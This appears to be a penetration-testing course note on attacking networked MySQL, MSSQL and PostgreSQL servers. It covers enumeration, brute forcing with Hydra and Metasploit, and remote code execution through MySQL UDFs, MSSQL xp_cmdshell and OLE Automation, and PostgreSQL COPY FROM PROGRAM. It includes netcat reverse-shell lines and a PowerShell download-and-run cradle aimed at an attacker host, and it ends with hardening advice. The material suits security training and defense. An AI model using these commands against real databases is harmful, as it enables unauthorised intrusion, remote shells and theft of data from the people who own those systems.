---
tags: [database, mysql, mssql, postgresql, brute-force, udf]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.15 Databases"
---

# 15 - MySQL, MSSQL, & PostgreSQL: Remote Access, Brute Force, & UDF Exploitation

## 1. Executive Summary

Relational Database Management Systems (RDBMS) are the backbone of modern web applications and enterprise infrastructure. When exposed over the network, databases like MySQL (Port 3306), Microsoft SQL Server (MSSQL - Port 1433), and PostgreSQL (Port 5432) become prime targets for attackers. 

Compromising a database doesn't just result in massive data exfiltration; it frequently leads to full remote code execution (RCE) on the underlying operating system. This is achieved by abusing native features designed for extending database functionality, such as User-Defined Functions (UDFs) in MySQL, `xp_cmdshell` in MSSQL, and `COPY FROM PROGRAM` in PostgreSQL. This document explores the mechanics of these attacks in extreme depth.

## 2. Protocol Overview & Architecture

### MySQL Protocol (TCP 3306)
MySQL uses a proprietary, binary-based application-level protocol. Authentication occurs via handshakes where the server sends a scramble string, and the client responds with a hashed password. Older versions (pre-MySQL 8.0) used `mysql_native_password` (SHA1-based), while modern versions use `caching_sha2_password` (SHA256-based), which is significantly harder to crack offline.

### MSSQL TDS Protocol (TCP 1433 / UDP 1434)
Microsoft SQL Server relies on the Tabular Data Stream (TDS) protocol. The SQL Server Browser service typically listens on UDP port 1434, providing clients with the correct TCP port for named instances. MSSQL supports both SQL Server Authentication (local DB users) and Windows Authentication (Kerberos/NTLM).

### PostgreSQL Protocol (TCP 5432)
PostgreSQL utilizes a message-based protocol. It supports multiple authentication mechanisms including `md5`, `scram-sha-256`, and `trust` (which permits unauthenticated access if the IP matches a specific `pg_hba.conf` rule).

## 3. Enumeration & Footprinting

Before attempting authentication attacks, deep enumeration is required to understand the target's configuration, version, and supported authentication mechanisms.

### Nmap Scripting Engine (NSE)
Use Nmap's comprehensive suite of database scripts to identify misconfigurations.

```bash
# MySQL Enumeration
nmap -p 3306 --script mysql-info,mysql-enum,mysql-empty-password,mysql-users <Target_IP>

# MSSQL Enumeration (Ping the browser service to find instances)
nmap -p 1433,1434 -sU -sS --script ms-sql-info,ms-sql-config,ms-sql-empty-password <Target_IP>

# PostgreSQL Enumeration
nmap -p 5432 --script pgsql-brute,pgsql-databases <Target_IP>
```

### Manual Banner Grabbing and Interaction
Sometimes, interacting directly with the service yields better versioning data.
```bash
# Connecting to PostgreSQL using psql
psql -h <Target_IP> -U postgres -W

# Connecting to MSSQL via Impacket or Sqsh
sqsh -S <Target_IP> -U sa -P ''
impacket-mssqlclient sa@<Target_IP> -windows-auth
```

## 4. Authentication Bypass & Brute Forcing

When default credentials (`root:root`, `sa:password123`, `postgres:postgres`) fail, brute-forcing is the next logical step.

### Hydra
Hydra is highly effective for online brute-forcing against standard RDBMS ports.

```bash
# MySQL Brute Force
hydra -L users.txt -P passwords.txt <Target_IP> mysql -t 4

# PostgreSQL Brute Force
hydra -l postgres -P passwords.txt <Target_IP> postgres -t 4
```

### Metasploit Framework
Metasploit offers robust modules that not only brute-force but also automatically map discovered credentials into the Metasploit database.

```text
msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 > set RHOSTS <Target_IP>
msf6 > set USERPASS_FILE /usr/share/wordlists/metasploit/mssql_default_pass.txt
msf6 > exploit
```

## 5. Exploitation Deep Dive

### 5.1 MySQL: User-Defined Functions (UDF) RCE
If an attacker compromises a high-privileged MySQL account (e.g., `root`), they can execute system commands by loading a custom User-Defined Function (UDF).

**Prerequisites:**
1. The `secure_file_priv` variable must be empty or misconfigured.
2. The MySQL user must have the `FILE` privilege.
3. The attacker must know the plugin directory (`@@plugin_dir`).

**Step-by-Step Exploitation:**
```sql
-- 1. Check privileges
SELECT user, host FROM mysql.user;
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'plugin_dir';

-- 2. Convert a compiled malicious UDF shared library (e.g., raptor_udf2.so) to Hex
-- Attacker machine: xxd -p raptor_udf2.so | tr -d '\n' > payload.hex

-- 3. Write the payload into the plugin directory
SELECT 0x<HEX_PAYLOAD> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- 4. Create the function
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- 5. Execute system commands
SELECT do_system('nc -e /bin/bash <Attacker_IP> 4444');
```

### 5.2 MSSQL: `xp_cmdshell` and OLE Automation
MSSQL includes a built-in extended stored procedure called `xp_cmdshell` that allows database users to execute operating system commands. By default, it is disabled.

**Enabling xp_cmdshell:**
```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC master..xp_cmdshell 'whoami';
```

**Alternative: OLE Automation (sp_OACreate)**
If `xp_cmdshell` is heavily monitored or strictly disabled, attackers can use OLE automation objects.
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c "powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://<Attacker_IP>/rev.ps1'')"'
```

### 5.3 PostgreSQL: Command Execution via `COPY` and UDF
From PostgreSQL 9.3 onwards, the `COPY TO/FROM PROGRAM` feature allows the execution of system commands natively without needing to upload shared libraries, provided the user has superuser privileges.

**Exploitation via COPY:**
```sql
-- 1. Create a dummy table to hold command output
CREATE TABLE cmd_exec(cmd_output text);

-- 2. Execute command and copy output into the table
COPY cmd_exec FROM PROGRAM 'id';

-- 3. Read the output
SELECT * FROM cmd_exec;

-- 4. Drop the table
DROP TABLE cmd_exec;
```

**Exploitation via libc UDF (Older Versions):**
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
SELECT system('nc -e /bin/bash <Attacker_IP> 4444');
```

## 6. ASCII Architecture & Attack Diagram

```text
+-----------------------+           +---------------------------------+
|                       |  TCP      |        Database Server          |
|  Attacker Machine     |==========>|        (MySQL / MSSQL / PG)     |
|                       |  Login    |                                 |
+-----------------------+           +---------------------------------+
           |                                         |
           | 1. Brute-force/Login (sa, root)         |
           |---------------------------------------->|
           |                                         |
           | 2. Reconfigure DB Engine                |
           |    (Enable xp_cmdshell / FILE privs)    |
           |---------------------------------------->|
           |                                         |
           | 3. Inject Payload / Call System Func    |
           |    (UDF .so injection / COPY PROGRAM)   |
           |---------------------------------------->|
           |                                         |
           |                                         | 4. Kernel Execution
           |                                         v
           |                                +-------------------------+
           | 5. Reverse Shell               |     Underlying OS       |
           |<-------------------------------|     (Linux / Windows)   |
           |                                +-------------------------+
```

## 7. Post-Exploitation & Persistence

Once RCE is achieved on the underlying host, the attacker will typically secure persistence and escalate privileges.
- **Service Accounts:** Databases often run as dedicated service accounts (e.g., `NT SERVICE\MSSQLSERVER` or `mysql`). Attackers will abuse privileges associated with these accounts (e.g., `SeImpersonatePrivilege` in Windows for Potato attacks).
- **Data Exfiltration:** Dumping PII, password hashes, and sensitive corporate data directly from the DB schema.
- **Lateral Movement:** Extracting plaintext credentials from database connection strings stored in local configuration files or using linked servers (in MSSQL) to pivot to other database instances.

## 8. Defense, Mitigation, & Hardening

1. **Network Segmentation & Firewalls:** Databases should NEVER be exposed directly to the internet. They should reside in isolated VLANs accessible only by authorized application servers.
2. **Least Privilege Principle:** Web applications should connect to the database using an account with severely restricted permissions (e.g., unable to use `DROP`, `FILE`, or `EXECUTE`).
3. **Disable Dangerous Features:** 
   - MSSQL: Ensure `xp_cmdshell` and OLE Automation are explicitly disabled and monitored via SIEM.
   - MySQL: Set `secure_file_priv` to a specific, restricted directory or `/dev/null` to prevent arbitrary file writes.
4. **Strong Authentication:** Enforce complex passwords and use certificate-based authentication or Active Directory integration where possible.
5. **Patching:** Keep the RDBMS software updated to protect against known authentication bypasses and RCE CVEs.

## 9. Chaining Opportunities

- **Web Attacks:** Database remote access attacks are frequently chained with **[[06 - SQL Injection (SQLi)]]** when internal RDBMS ports are exposed.
- **Active Directory:** MSSQL compromises often lead directly to domain escalation. See **[[01 - Introduction to Active Directory]]** and related lateral movement notes.
- **Privilege Escalation:** Exploiting database service accounts is a prime vector for local privilege escalation. See **[[08 - Linux Privilege Escalation]]** and **[[09 - Windows Privilege Escalation]]**.

## 10. Related Notes
- [[16 - Redis — Unauthenticated Access, RCE via Config Set]]
- [[17 - MongoDB — No Auth, Exposed Port]]
- [[18 - Elasticsearch — Open Access, Data Exfiltration]]
- [[20 - Docker API — Exposed Daemon, Container Escape]]
